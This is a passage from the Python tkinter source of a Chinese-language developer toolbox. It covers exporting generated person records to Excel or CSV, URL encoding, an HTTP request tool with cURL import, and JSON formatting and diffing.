            gap = target_px - str_pixel_w(s)
            if gap <= 0:
                return s
            space_px = _font.measure(' ')
            return s + ' ' * ((gap + space_px - 1) // space_px)

        # 每列目标宽度 = max(表头宽度, 数据最大宽度) + 2格空格
        space_px = _font.measure(' ')
        col_max = [_font.measure(h) for h in headers]
        for p in person_list:
            for i, h in enumerate(headers):
                col_max[i] = max(col_max[i], str_pixel_w(p[h]))
        COL_TARGET_PX = [w + space_px * 2 for w in col_max]

        lines = []
        header_line = ' '.join(pad_px(h, COL_TARGET_PX[i]) for i, h in enumerate(headers))
        lines.append(header_line)
        lines.append("-" * max(sum(COL_TARGET_PX) // space_px, 80))

        for p in person_list:
            vals = [p[h] for h in headers]
            line = ' '.join(pad_px(vals[i], COL_TARGET_PX[i]) for i in range(len(headers)))
            lines.append(line)

        result = "\n".join(lines)
        print(f"已生成 {count} 条人员信息（银行: {bank_name}）")
        return result

    def _person_done(self, result):
        if result:
            self._person_result.delete("1.0", "end")
            self._person_result.insert("1.0", result)
        else:
            self._person_result.delete("1.0", "end")
            self._log_result_banner(False)

    def _person_copy(self):
        """复制表格到剪贴板（通过Excel COM保留文本格式）"""
        if not hasattr(self, '_person_data') or not self._person_data:
            self._notify("没有可复制的内容")
            return

        headers = ["姓名", "性别", "年龄", "出生日期", "身份证号", "手机号", "银行卡号"]
        tmp = None

        try:
            import openpyxl
            import subprocess
            import tempfile

            wb = openpyxl.Workbook()
            ws = wb.active
            for col, h in enumerate(headers, 1):
                c = ws.cell(row=1, column=col, value=h)
                c.number_format = '@'
            for row, p in enumerate(self._person_data, 2):
                for col, h in enumerate(headers, 1):
                    c = ws.cell(row=row, column=col, value=str(p[h]))
                    c.number_format = '@'

            tmp = os.path.join(tempfile.gettempdir(), '_clip_copy.xlsx')
            wb.save(tmp)

            ps = (
                "$excel = New-Object -ComObject Excel.Application\n"
                "$excel.Visible = $false\n"
                "$excel.DisplayAlerts = $false\n"
                "$wb = $excel.Workbooks.Open('" + tmp.replace("'", "''") + "')\n"
                "$ws = $wb.Sheets.Item(1)\n"
                "$ws.UsedRange.Copy()\n"
                "$wb.Close($false)\n"
                "$excel.Quit()\n"
                "[System.Runtime.Interopservices.Marshal]::ReleaseComObject($excel) | Out-Null\n"
            )
            r = subprocess.run(
                ["powershell", "-NoProfile", "-NonInteractive", "-Command", ps],
                capture_output=True, timeout=30
            )
            if r.returncode != 0:
                raise RuntimeError(r.stderr.decode(errors='replace'))

            self._notify("已复制到剪贴板（Excel格式）")
        except Exception:
            # TSV降级：身份证号/手机号/银行卡号前加单引号，
            # 防止Excel将这些长数字识别为数值并转换为科学计数法
            text_col_indices = {4, 5, 6}
            tsv_lines = ['\t'.join(headers)]
            for p in self._person_data:
                vals = []
                for i, h in enumerate(headers):
                    v = str(p[h])
                    if i in text_col_indices:
                        v = "'" + v
                    vals.append(v)
                tsv_lines.append('\t'.join(vals))
            tsv = '\n'.join(tsv_lines)
            self.clipboard_clear()
            self.clipboard_append(tsv)
            self._notify("已复制到剪贴板（TSV格式）")
        finally:
            if tmp:
                try:
                    os.remove(tmp)
                except Exception:
                    pass

    def _person_export_excel(self):
        """导出为Excel文件"""
        if not hasattr(self, '_person_data') or not self._person_data:
            self._notify("没有可导出的数据")
            return

        try:
            import openpyxl
            from openpyxl.styles import Font
        except ImportError:
            return self._person_export_csv()

        f = filedialog.asksaveasfilename(
            title="导出Excel文件",
            defaultextension=".xlsx",
            initialdir=os.path.join(_APP_DIR, "data"),
            initialfile="人员信息.xlsx",
            filetypes=[("Excel文件", "*.xlsx"), ("所有文件", "*.*")]
        )
        if not f:
            return

        try:
            wb = openpyxl.Workbook()
            ws = wb.active
            ws.title = "人员信息"

            headers = ["姓名", "性别", "年龄", "出生日期", "身份证号", "手机号", "银行卡号"]

            # 身份证号、手机号、银行卡号列索（从1开始）
            text_col_indices = [5, 6, 7]

            # 写入表头
            for col_idx, h in enumerate(headers):
                cell = ws.cell(row=1, column=col_idx + 1)
                cell.value = h
                cell.font = Font(bold=True)

            # 写入数据
            for row_offset, p in enumerate(self._person_data):
                row_num = row_offset + 2
                for col_idx, h in enumerate(headers):
                    cell = ws.cell(row=row_num, column=col_idx + 1)
                    if col_idx + 1 in text_col_indices:
                        cell.number_format = '@'
                        cell.value = str(p[h])
                    else:
                        cell.value = p[h]

            # 自动调整列宽
            for col in ws.columns:
                max_length = 0
                col_letter = col[0].column_letter
                for cell in col:
                    try:
                        cell_len = len(str(cell.value))
                        chinese_chars = sum(1 for c in str(cell.value) if '\u4e00' <= c <= '\u9fff')
                        cell_len += chinese_chars
                        if cell_len > max_length:
                            max_length = cell_len
                    except:
                        pass
                ws.column_dimensions[col_letter].width = min(max_length + 2, 30)

            wb.save(f)
            self._log(f"已导出Excel: {f}\n")
        except Exception as e:
            messagebox.showerror("错误", f"导出失败: {e}")

    def _person_export_csv(self):
        """导出为CSV文件（备选方案）"""
        import csv

        f = filedialog.asksaveasfilename(
            title="导出CSV文件",
            defaultextension=".csv",
            initialfile="人员信息.csv",
            filetypes=[("CSV文件", "*.csv"), ("所有文件", "*.*")]
        )
        if not f:
            return

        try:
            headers = ["姓名", "性别", "年龄", "出生日期", "身份证号", "手机号", "银行卡号"]
            with open(f, "w", newline="", encoding="utf-8-sig") as csvfile:
                writer = csv.DictWriter(csvfile, fieldnames=headers)
                writer.writeheader()
                for p in self._person_data:
                    writer.writerow(p)
            self._log(f"已导出CSV: {f}\n")
        except Exception as e:
            messagebox.showerror("错误", f"导出失败: {e}")

    # =============== 页面8: URL编码解码 ===============
    def _show_page_url(self):
        self.title_label.config(text="URL编码解码")
        self._label(self.content, "对文本进行 URL 百分号编码/解码（UTF-8）。").pack(anchor="w", pady=(0, 8))

        tk.Label(self.content, text="输入:", bg="#f5f6fa",
                 font=("Microsoft YaHei UI", 10)).pack(anchor="w")
        self._url_input = tk.Text(self.content, height=6, font=("Consolas", 10),
                                  wrap="word", bg="white")
        self._url_input.pack(fill="both", expand=True)

        btn_row = self._row(self.content)
        tk.Button(btn_row, text="编码", command=lambda: self._url_run(True),
                  bg="#1abc9c", fg="white",
                  font=("Microsoft YaHei UI", 11, "bold"), width=12).pack(side="left", pady=6)
        tk.Button(btn_row, text="解码", command=lambda: self._url_run(False),
                  bg="#3498db", fg="white",
                  font=("Microsoft YaHei UI", 11, "bold"), width=12).pack(side="left", padx=(10, 0))
        tk.Button(btn_row, text="复制结果", command=self._url_copy, width=12).pack(side="left", padx=(10, 0))
        tk.Button(btn_row, text="清空", command=self._url_clear, width=10).pack(side="left", padx=(10, 0))

        tk.Label(self.content, text="结果:", bg="#f5f6fa",
                 font=("Microsoft YaHei UI", 10)).pack(anchor="w", pady=(4, 3))
        self._url_output = tk.Text(self.content, height=6, font=("Consolas", 10),
                                   wrap="word", bg="white")
        self._url_output.pack(fill="both", expand=True)

    def _url_run(self, encode):
        text = self._url_input.get("1.0", "end-1c")
        if not text:
            self._notify("请输入内容")
            return
        self._start_task(self._url_convert, text, encode,
                         on_done=self._url_done)

    def _url_convert(self, text, encode):
        if encode:
            result = url_encode(text)
        else:
            result = url_decode(text)
        print(f"{'编码' if encode else '解码'}完成，{len(text)} -> {len(result)} 字符")
        return result

    def _url_done(self, result):
        if result is None:
            self._log_result_banner(False)
            return
        self._url_output.delete("1.0", "end")
        self._url_output.insert("1.0", result)
        self._log_result_banner(True)

    def _url_copy(self):
        text = self._url_output.get("1.0", "end-1c")
        if not text:
            self._notify("没有可复制的内容")
            return
        self.clipboard_clear()
        self.clipboard_append(text)
        self._notify("已复制到剪贴板")

    def _url_clear(self):
        self._url_input.delete("1.0", "end")
        self._url_output.delete("1.0", "end")

    # =============== 页面9: 接口请求 ===============
    def _show_page_http(self):
        self.title_label.config(text="接口请求")
        self._label(self.content, "发送 GET / POST 请求，查看响应状态、头和内容。").pack(anchor="w", pady=(0, 8))

        r1 = self._row(self.content)
        self._label(r1, "方法:").pack(side="left")
        self._http_method_var = tk.StringVar(value="GET")
        ttk.Combobox(r1, textvariable=self._http_method_var, state="readonly",
                     values=["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"], width=10).pack(side="left", padx=(4, 10))
        self._label(r1, "URL:").pack(side="left")
        tk.Entry(r1, textvariable=self._http_url_var).pack(
            side="left", padx=4, fill="x", expand=True)
        # BUG-06: 超时时间可配置
        self._http_timeout_var = tk.StringVar(value="15")
        self._label(r1, "超时(秒):").pack(side="left")
        tk.Entry(r1, textvariable=self._http_timeout_var, width=5).pack(side="left", padx=(4, 0))

        # === 主区域：用 PanedWindow 分割请求区和响应区 ===
        style = ttk.Style()
        style.configure("Treeview", borderwidth=1, relief="solid", fieldbackground="white")
        style.configure("Treeview.Heading", borderwidth=1, relief="solid", padding=4)
        # 标签页选中蓝底白字需要 clam 主题（Windows 默认 vista 主题会忽略 Tab 颜色配置）
        try:
            style.theme_use("clam")
        except tk.TclError:
            pass
        style.configure("My.TNotebook", background="#e0e0e0")
        style.configure("My.TNotebook.Tab", padding=(12, 4), background="#d0d0d0")
        style.map("My.TNotebook.Tab", background=[("selected", "#3498db"), ("!selected", "#d0d0d0")],
                  foreground=[("selected", "white"), ("!selected", "black")])

        main_pane = tk.PanedWindow(self.content, orient="vertical", sashrelief="flat",
                                   bg="#d0d0d0", sashwidth=5, opaqueresize=True)
        main_pane.pack(fill="both", expand=True, pady=(4, 0))

        # ---- 请求区 ----
        req_frame = tk.Frame(main_pane, bg="#f5f6fa")
        # BUG-01: 显式指定请求区初始高度和更大的 minsize，防止区域被压缩为 0
        # 导致请求头/请求体/cURL 导入区全部不可见
        main_pane.add(req_frame, minsize=240, height=340)

        # 请求头和请求体横向排列
        hbox = tk.PanedWindow(req_frame, orient="horizontal", sashrelief="flat",
                              bg="#d0d0d0", sashwidth=5, opaqueresize=True)  # 各占一半可拖动
        hbox.pack(fill="x", pady=(0, 4))

        # Left: Headers
        hdr_left = tk.Frame(hbox, bg="#f5f6fa")
        hbox.add(hdr_left, minsize=200, width=400, stretch="always")
        tk.Label(hdr_left, text="请求头 (每行 Key: Value，可空):", bg="#f5f6fa",
                 font=("Microsoft YaHei UI", 10)).pack(anchor="w")
        self._headers_nb = ttk.Notebook(hdr_left, style="My.TNotebook")
        # 构建探针：延迟上报，避免被 _restore_log 覆盖
        self._headers_nb.pack(fill="both", expand=True)
        self._hdr_text_frame = tk.Frame(self._headers_nb)
        self._headers_nb.add(self._hdr_text_frame, text="文本")
        self._http_headers_text = tk.Text(self._hdr_text_frame, height=4, font=("Consolas", 10),
                                                wrap="word", bg="white")
        self._http_headers_text.pack(fill="both", expand=True)
        self._http_headers_text.insert("1.0",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36\n"
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\n"
            "Accept-Language: zh-CN,zh;q=0.9,en;q=0.8")
        self._hdr_table_frame = tk.Frame(self._headers_nb)
        self._headers_nb.add(self._hdr_table_frame, text="表格")
        # BUG-08: 改用带单元格边框的 KeyValueTable（原 Treeview 单元格无边框）
        self._hdr_tree = KeyValueTable(self._hdr_table_frame, headings=("Key", "Value"), height=4)
        self._hdr_tree.pack(fill="both", expand=True, side="left")
        hdr_scroll = ttk.Scrollbar(self._hdr_table_frame, orient="vertical", command=self._hdr_tree.yview)
        hdr_scroll.pack(side="right", fill="y")
        btn_frame = tk.Frame(self._hdr_table_frame)
        btn_frame.pack(side="bottom", fill="x", pady=2, before=self._hdr_tree)  # 先保留按钮空间，缩小窗口时不被挤掉
        tk.Button(btn_frame, text="添加", command=self._add_hdr_row, width=6).pack(side="left", fill="x", padx=2, expand=True)
        tk.Button(btn_frame, text="删除", command=self._del_hdr_row, width=6).pack(side="left", fill="x", padx=2, expand=True)

        # Right: Body
        self.after(0, lambda m="[构建] 请求头区完成": self._notify(m))
        body_left = tk.Frame(hbox, bg="#f5f6fa")
        hbox.add(body_left, minsize=200, width=400, stretch="always")
        tk.Label(body_left, text="请求体 (POST时使用，可空):", bg="#f5f6fa",
                 font=("Microsoft YaHei UI", 10)).pack(anchor="w")
        self._body_nb = ttk.Notebook(body_left, style="My.TNotebook")
        self._body_nb.pack(fill="both", expand=True)
        self._body_text_frame = tk.Frame(self._body_nb)
        self._body_nb.add(self._body_text_frame, text="文本")
        self._http_body_text = tk.Text(self._body_text_frame, height=4, font=("Consolas", 10),
                                                wrap="word", bg="white")
        self._http_body_text.pack(fill="both", expand=True)
        self._body_table_frame = tk.Frame(self._body_nb)
        self._body_nb.add(self._body_table_frame, text="表格")
        # BUG-08: 改用带单元格边框的 KeyValueTable（原 Treeview 单元格无边框）
        self._body_tree = KeyValueTable(self._body_table_frame, headings=("Key", "Value"), height=4)
        self._body_tree.pack(fill="both", expand=True, side="left")
        body_scroll = ttk.Scrollbar(self._body_table_frame, orient="vertical", command=self._body_tree.yview)
        body_scroll.pack(side="right", fill="y")
        btn_frame2 = tk.Frame(self._body_table_frame)
        btn_frame2.pack(side="bottom", fill="x", pady=2, before=self._body_tree)  # 先保留按钮空间，缩小窗口时不被挤掉
        tk.Button(btn_frame2, text="添加", command=self._add_body_row, width=6).pack(side="left", fill="x", padx=2, expand=True)
        tk.Button(btn_frame2, text="删除", command=self._del_body_row, width=6).pack(side="left", fill="x", padx=2, expand=True)

        # cURL 导入
        self.after(0, lambda m="[构建] 请求体区完成": self._notify(m))
        curl_frame = tk.Frame(req_frame, bg="#f5f6fa")
        curl_frame.pack(fill="x", pady=(4, 2))
        self._curl_text = tk.Text(curl_frame, height=2, font=("Consolas", 10), wrap="word", bg="white")
        self._curl_text.pack(side="left", fill="x", expand=True, padx=(0, 4))
        tk.Button(curl_frame, text="导入接口", command=self._import_curl,
                  bg="#3498db", fg="white", font=("Microsoft YaHei UI", 10, "bold"), width=10).pack(side="left")

        # 发送/清空按钮
        self.after(0, lambda m="[构建] cURL导入区完成": self._notify(m))
        btn_row = tk.Frame(req_frame, bg="#f5f6fa")
        btn_row.pack(fill="x", pady=(4, 0))
        tk.Button(btn_row, text="发送请求", command=self._http_run,
                  bg="#1abc9c", fg="white",
                  font=("Microsoft YaHei UI", 11, "bold"), width=14).pack(side="left", padx=(0, 10))
        tk.Button(btn_row, text="清空响应", command=self._http_clear, width=10).pack(side="left")

        # ---- 响应区 ----
        self.after(0, lambda m="[构建] 发送按钮区完成": self._notify(m))
        resp_frame = tk.Frame(main_pane, bg="#f5f6fa")
        main_pane.add(resp_frame, minsize=140, height=220)  # BUG-01: 保证响应区有可见高度

        tk.Label(resp_frame, text="响应:", bg="#f5f6fa",
                 font=("Microsoft YaHei UI", 10)).pack(anchor="w", pady=(0, 3))
        self._resp_nb = ttk.Notebook(resp_frame)
        self._resp_nb.pack(fill="both", expand=True)
        self._resp_raw_frame = tk.Frame(self._resp_nb)
        self._resp_nb.add(self._resp_raw_frame, text="原始")
        self._http_output = tk.Text(self._resp_raw_frame, font=("Consolas", 10),
                                     wrap="word", bg="white")
        self._http_output.pack(fill="both", expand=True)
        self._resp_headers_frame = tk.Frame(self._resp_nb)
        self._resp_nb.add(self._resp_headers_frame, text="响应头")
        self._http_headers_output = tk.Text(self._resp_headers_frame, font=("Consolas", 10),
                                              wrap="word", bg="white")
        self._http_headers_output.pack(fill="both", expand=True)
        self._resp_body_frame = tk.Frame(self._resp_nb)
        self._resp_nb.add(self._resp_body_frame, text="响应体")
        self._http_body_output = tk.Text(self._resp_body_frame, font=("Consolas", 10),
                                          wrap="word", bg="white")
        self._http_body_output.pack(fill="both", expand=True)
        self.after(0, lambda m="[构建] 接口请求页面全部构建完成": self._notify(m))

    def _add_hdr_row(self):
        self._hdr_tree.insert("", "end", values=("", ""))
        print(f"[DEBUG] _add_hdr_row: _ids={self._hdr_tree.get_children()}, _selected={self._hdr_tree._selected}")

    def _del_hdr_row(self):
        sel = self._hdr_tree.selection()
        print(f"[DEBUG] _del_hdr_row: sel={sel}, _selected={self._hdr_tree._selected}")
        if not sel:  # 未选中则删除最后一行
            kids = self._hdr_tree.get_children()
            print(f"[DEBUG] _del_hdr_row: kids={kids}")
            if not kids:
                return
            sel = (kids[-1],)
        for item in sel:
            self._hdr_tree.delete(item)
        print(f"[DEBUG] _del_hdr_row after delete: _ids={self._hdr_tree.get_children()}")

    def _add_body_row(self):
        self._body_tree.insert("", "end", values=("", ""))

    def _del_body_row(self):
        sel = self._body_tree.selection()
        if not sel:  # 未选中则删除最后一行
            kids = self._body_tree.get_children()
            if not kids:
                return
            sel = (kids[-1],)
        for item in sel:
            self._body_tree.delete(item)

    def _on_hdr_tree_double_click(self, event):
        region = self._hdr_tree.identify_region(event.x, event.y)
        if region != "cell":
            return
        column = self._hdr_tree.identify_column(event.x)
        item = self._hdr_tree.identify_row(event.y)
        if not item:
            return
        x, y, w, h = self._hdr_tree.bbox(item, column)
        entry = tk.Entry(self._hdr_tree)
        entry.place(x=x, y=y, width=w, height=h)
        entry.insert(0, self._hdr_tree.set(item, column))
        entry.focus_set()
        entry.select_range(0, tk.END)
        def _save(ev=None):
            self._hdr_tree.set(item, column, entry.get())
            entry.destroy()
            self._sync_tree_to_text(self._hdr_tree, self._http_headers_text)
        entry.bind("<Return>", _save)
        entry.bind("<Escape>", lambda ev: entry.destroy())
        entry.bind("<FocusOut>", _save)

    def _on_body_tree_double_click(self, event):
        region = self._body_tree.identify_region(event.x, event.y)
        if region != "cell":
            return
        column = self._body_tree.identify_column(event.x)
        item = self._body_tree.identify_row(event.y)
        if not item:
            return
        x, y, w, h = self._body_tree.bbox(item, column)
        entry = tk.Entry(self._body_tree)
        entry.place(x=x, y=y, width=w, height=h)
        entry.insert(0, self._body_tree.set(item, column))
        entry.focus_set()
        entry.select_range(0, tk.END)
        def _save(ev=None):
            self._body_tree.set(item, column, entry.get())
            entry.destroy()
            self._sync_tree_to_text(self._body_tree, self._http_body_text)
        entry.bind("<Return>", _save)
        entry.bind("<Escape>", lambda ev: entry.destroy())
        entry.bind("<FocusOut>", _save)

    def _sync_text_to_tree(self, tree, text_widget):
        for item in tree.get_children():
            tree.delete(item)
        text = text_widget.get("1.0", "end-1c")
        for line in text.splitlines():
            line = line.strip()
            if not line or ":" not in line:
                continue
            k, v = line.split(":", 1)
            tree.insert("", "end", values=(k.strip(), v.strip()))

    def _nb_selected_index(self, nb):
        """容错获取 Notebook 当前选中页索引（控件未就绪时返回 -1）"""
        try:
            return nb.index(nb.select())
        except tk.TclError:
            return -1

    def _sync_tree_to_text(self, tree, text_widget):
        lines = []
        for item in tree.get_children():
            values = tree.item(item, "values")
            k = values[0] if len(values) > 0 else ""
            v = values[1] if len(values) > 1 else ""
            lines.append(f"{k}: {v}")
        text_widget.delete("1.0", "end")
        text_widget.insert("1.0", "\n".join(lines))

    def _import_curl(self):
        """导入cURL命令，解析URL、方法、请求头和请求体"""
        import re
        curl = self._curl_text.get("1.0", "end-1c").strip()
        if not curl:
            self._notify("请输入cURL命令")
            return
        try:
            method = "GET"
            has_data = False
            url = ""
            headers = []
            body_parts = []  # BUG-03: 多个 -d 参数收集后用 & 拼接
            # 匹配 -X/--request 方法
            m = re.search(r'-(?:X|request)\s+(\w+)', curl, re.IGNORECASE)
            if m:
                method = m.group(1).upper()
            # 匹配 -d/--data/--data-raw 请求体
            for dm in re.finditer(r'-(?:d|data|data-raw)\s+([\'"]?)(.*?)\1', curl, re.IGNORECASE):
                bval = dm.group(2).strip()
                if bval:
                    if bval.startswith(("'", '"')) and bval.endswith(("'", '"')):
                        bval = bval[1:-1]
                    body_parts.append(bval)
                    has_data = True
            body = "&".join(body_parts) if body_parts else None
            if has_data and method == "GET":
                method = "POST"
            # 匹配 -H/--header 请求头（支持单双引号包裹）
            for hm in re.finditer(r'-(?:H|header)\s+([\'"]?)(.*?)\1(?=\s|$)', curl, re.IGNORECASE):
                hval = hm.group(2).strip()
                if hval:
                    headers.append(hval)
            # 提取 URL（第一个非 - 开头的参数，或 -o/-url 后的值）
            url_match = re.search(r'"(https?://[^"]+)"', curl)
            if not url_match:
                url_match = re.search(r"(https?://\S+)", curl)
            if url_match:
                url = url_match.group(1).strip("\"'")  # BUG-03: 去掉尾部误带入的引号
            self._http_url_var.set(url)
            if method:
                self._http_method_var.set(method)
            self._http_headers_text.delete("1.0", "end")
            htext = "\n".join(headers)
            if htext:
                self._http_headers_text.insert("1.0", htext + "\n")
            self._sync_text_to_tree(self._hdr_tree, self._http_headers_text)
            if body:
                self._http_body_text.delete("1.0", "end")
                self._http_body_text.insert("1.0", body)
                self._sync_text_to_tree(self._body_tree, self._http_body_text)
            self._notify("cURL导入成功")
        except Exception as e:
            self._notify(f"cURL解析失败: {e}")

    def _http_run(self):
        url = self._http_url_var.get().strip()
        if not url:
            self._notify("请输入URL")
            return
        method = self._http_method_var.get()
        if self._nb_selected_index(self._headers_nb) == 1:
            self._sync_tree_to_text(self._hdr_tree, self._http_headers_text)
        headers_raw = self._http_headers_text.get("1.0", "end-1c")
        if self._nb_selected_index(self._body_nb) == 1:
            self._sync_tree_to_text(self._body_tree, self._http_body_text)
        body = self._http_body_text.get("1.0", "end-1c").strip() or None
        try:
            headers = parse_headers(headers_raw) if headers_raw else None
        except ValueError as e:
            self._notify(str(e))
            return
        try:
            timeout = float(self._http_timeout_var.get().strip() or 15)
            if timeout <= 0:
                timeout = 15
        except (ValueError, AttributeError):
            timeout = 15
        self._start_task(self._http_send, method, url, headers, body, timeout,
                         on_done=self._http_done)

    def _http_send(self, method, url, headers, body, timeout=15):
        resp = send_request(method, url, headers=headers, body=body, timeout=timeout)
        return resp

    def _http_done(self, resp):
        if resp is None:
            self._log_result_banner(False)
            return
        self._http_output.delete("1.0", "end")
        # BUG-07: 响应过大时截断，避免卡死 UI
        raw_text = format_response(resp)
        if len(raw_text) > 200000:
            raw_text = raw_text[:200000] + f"\n...[内容过长已截断，完整共 {len(raw_text)} 字符]"
        self._http_output.insert("1.0", raw_text)
        headers_text = "\n".join(f"{k}: {v}" for k, v in resp.get("headers", {}).items())
        self._http_headers_output.delete("1.0", "end")
        self._http_headers_output.insert("1.0", headers_text)
        self._http_body_output.delete("1.0", "end")
        # BUG-07: 响应体过大时截断
        body_text = resp.get("body", "")
        if len(body_text) > 200000:
            body_text = body_text[:200000] + f"\n...[响应体过长已截断，完整共 {len(body_text)} 字符]"
        self._http_body_output.insert("1.0", body_text)
        self._log_result_banner(True)

    def _http_clear(self):
        self._http_output.delete("1.0", "end")
        self._http_headers_output.delete("1.0", "end")
        self._http_body_output.delete("1.0", "end")

    # =============== 页面10: JSON格式化 ===============
    def _show_page_json(self):
        self.title_label.config(text="JSON格式化")
        self._label(self.content, "输入 JSON 文本，点击按钮后直接在输入框中原地格式化或压缩。").pack(anchor="w", pady=(0, 8))

        tk.Label(self.content, text="输入:", bg="#f5f6fa",
                 font=("Microsoft YaHei UI", 10)).pack(anchor="w")
        self._json_input = tk.Text(self.content, height=16, font=("Consolas", 10),
                                   wrap="word", bg="white")
        self._json_input.pack(fill="both", expand=True)

        btn_row = self._row(self.content)
        tk.Button(btn_row, text="格式化", command=lambda: self._json_run("format"),
                  bg="#1abc9c", fg="white",
                  font=("Microsoft YaHei UI", 11, "bold"), width=12).pack(side="left", pady=6)
        tk.Button(btn_row, text="压缩为字符串", command=lambda: self._json_run("compact"),
                  bg="#3498db", fg="white",
                  font=("Microsoft YaHei UI", 11, "bold"), width=14).pack(side="left", padx=(10, 0))
        tk.Button(btn_row, text="复制", command=self._json_copy, width=10).pack(side="left", padx=(10, 0))
        tk.Button(btn_row, text="清空", command=self._json_clear, width=8).pack(side="left", padx=(10, 0))

    def _json_run(self, mode):
        text = self._json_input.get("1.0", "end-1c")
        if not text:
            self._notify("请输入JSON内容")
            return
        self._start_task(self._json_convert, text, mode,
                         on_done=self._json_done)

    def _json_convert(self, text, mode):
        if mode == "format":
            result = json_format(text)
        else:
            result = json_compact(text)
        print(f"JSON处理完成（{mode}）")
        return result

    def _json_done(self, result):
        if result is None:
            self._log_result_banner(False)
            return
        self._json_input.delete("1.0", "end")
        self._json_input.insert("1.0", result)
        self._log_result_banner(True)

    def _json_copy(self):
        text = self._json_input.get("1.0", "end-1c")
        if not text:
            self._notify("没有可复制的内容")
            return
        self.clipboard_clear()
        self.clipboard_append(text)
        self._notify("已复制到剪贴板")

    def _json_clear(self):
        self._json_input.delete("1.0", "end")

    # =============== 页面11: JSON对比 ===============
    def _show_page_jsondiff(self):
        self.title_label.config(text="JSON对比")
        self._label(self.content, "点击「排序后对比」：两框 JSON 按统一规则排序，"
                                  "差异行橙色背景，差异字符红色字体。").pack(anchor="w", pady=(0, 8))

        # 查看选项区域
        opt_frame = tk.Frame(self.content, bg="#f5f6fa")
        opt_frame.pack(fill="x", pady=(0, 5))
        self._label(opt_frame, "查看选项:").pack(side="left")
        self._jd_scroll_mode = tk.StringVar(value="同步滚动")
        ttk.Combobox(opt_frame, textvariable=self._jd_scroll_mode, state="readonly",
                     values=["同步滚动", "自由查看"], width=12).pack(side="left", padx=8)

        # 主内容区域（带行号）
        paned = tk.PanedWindow(self.content, orient="horizontal", sashwidth=5,
                               bg="#f5f6fa")
        paned.pack(fill="both", expand=True)

        # 左侧：行号 + 原始JSON
        left_frame = tk.Frame(paned, bg="#f5f6fa")
        tk.Label(left_frame, text="原始JSON:", bg="#f5f6fa",
                 font=("Microsoft YaHei UI", 10)).pack(anchor="w")
        
        left_content = tk.Frame(left_frame, bg="#f5f6fa")
        left_content.pack(fill="both", expand=True)
        
        self._jd_left_line_numbers = tk.Text(left_content, width=4, font=("Consolas", 10),
                                     bg="#f0f0f0", state="disabled", wrap="none")
        self._jd_left_line_numbers.pack(side="left", fill="y")
        
        self._jd_left = tk.Text(left_content, font=("Consolas", 10),
                                wrap="word", bg="white")
        self._jd_left.pack(side="left", fill="both", expand=True)

        # 右侧：行号 + 对比JSON
        right_frame = tk.Frame(paned, bg="#f5f6fa")
        tk.Label(right_frame, text="对比JSON:", bg="#f5f6fa",
                 font=("Microsoft YaHei UI", 10)).pack(anchor="w")
        
        right_content = tk.Frame(right_frame, bg="#f5f6fa")
        right_content.pack(fill="both", expand=True)
        
        self._jd_right_line_numbers = tk.Text(right_content, width=4, font=("Consolas", 10),
                                      bg="#f0f0f0", state="disabled", wrap="none")
        self._jd_right_line_numbers.pack(side="left", fill="y")
        
        self._jd_right = tk.Text(right_content, font=("Consolas", 10),
                                 wrap="word", bg="white")
        self._jd_right.pack(side="left", fill="both", expand=True)

        paned.add(left_frame, stretch="always")
        paned.add(right_frame, stretch="always")

        # 输入框内标注标签
        for w in (self._jd_left, self._jd_right):
            w.tag_config("changed_bg", background="#ffeaa7")               # 淡橙色
            w.tag_config("changed_fg", foreground="#d63031",
                         font=("Consolas", 10, "bold"))                    # 红色加粗

        # 绑定滚动事件（实现同步滚动）
        self._jd_left.bind("<MouseWheel>", self._jd_on_scroll_left)
        self._jd_right.bind("<MouseWheel>", self._jd_on_scroll_right)

        btn_row = self._row(self.content)
        tk.Button(btn_row, text="排序后对比", command=self._jd_compare,
                  bg="#1abc9c", fg="white",
                  font=("Microsoft YaHei UI", 11, "bold"), width=14).pack(side="left", pady=6)
        tk.Button(btn_row, text="清空", command=self._jd_clear, width=8).pack(side="left", padx=(10, 0))

    def _jd_update_line_numbers(self, text_widget, line_numbers_widget):
        """更新行号显示"""
        line_numbers_widget.config(state="normal")
        line_numbers_widget.delete("1.0", "end")
        line_count = int(text_widget.index("end-1c").split(".")[0])
        line_numbers_text = "\n".join(str(i) for i in range(1, line_count + 1))
        line_numbers_widget.insert("1.0", line_numbers_text)
        line_numbers_widget.config(state="disabled")

    def _jd_sync_scroll_left(self, *args):
        """左侧滚动时同步右侧"""
        self._jd_right.yview_moveto(args[0])
        self._jd_right_line_numbers.yview_moveto(args[0])

    def _jd_sync_scroll_right(self, *args):
        """右侧滚动时同步左侧"""
        self._jd_left.yview_moveto(args[0])
        self._jd_left_line_numbers.yview_moveto(args[0])

    def _jd_on_scroll_left(self, event):
        """左侧滚动事件处理"""
        if self._jd_scroll_mode.get() == "同步滚动":
            # 获取滚动位置
            first, last = self._jd_left.yview()
            # 同步右侧
            self._jd_right.yview_moveto(first)
            self._jd_right_line_numbers.yview_moveto(first)
            self._jd_left_line_numbers.yview_moveto(first)

    def _jd_on_scroll_right(self, event):
        """右侧滚动事件处理"""
        if self._jd_scroll_mode.get() == "同步滚动":
            # 获取滚动位置
            first, last = self._jd_right.yview()
            # 同步左侧
            self._jd_left.yview_moveto(first)
            self._jd_left_line_numbers.yview_moveto(first)
            self._jd_right_line_numbers.yview_moveto(first)

    def _jd_compare(self):
        t1 = self._jd_left.get("1.0", "end-1c")
        t2 = self._jd_right.get("1.0", "end-1c")
        if not t1 or not t2:
            self._notify("请输入两段JSON内容")
            return
        # 先校验合法性
        try:
            json.loads(t1)
        except Exception as e:
            self._notify(f"左侧JSON格式错误: {e}")
            return
        try:
            json.loads(t2)
        except Exception as e:
            self._notify(f"右侧JSON格式错误: {e}")
            return
        self._start_task(self._jd_do_compare, t1, t2,
                         on_done=self._jd_done)

    def _jd_do_compare(self, t1, t2):
        s1 = json_sort(t1)
        s2 = json_sort(t2)
        left_spans, right_spans = json_diff_spans(s1, s2)
        print(f"排序完成, 差异标注: 左侧 {len(left_spans)} 处, 右侧 {len(right_spans)} 处")
        return (s1, s2, left_spans, right_spans)

    def _jd_done(self, result):
        if result is None:
            self._log_result_banner(False)
            return
        s1, s2, left_spans, right_spans = result
        # 用排序后的JSON替换两框内容
        self._jd_left.delete("1.0", "end")
        self._jd_left.insert("1.0", s1)
        self._jd_right.delete("1.0", "end")
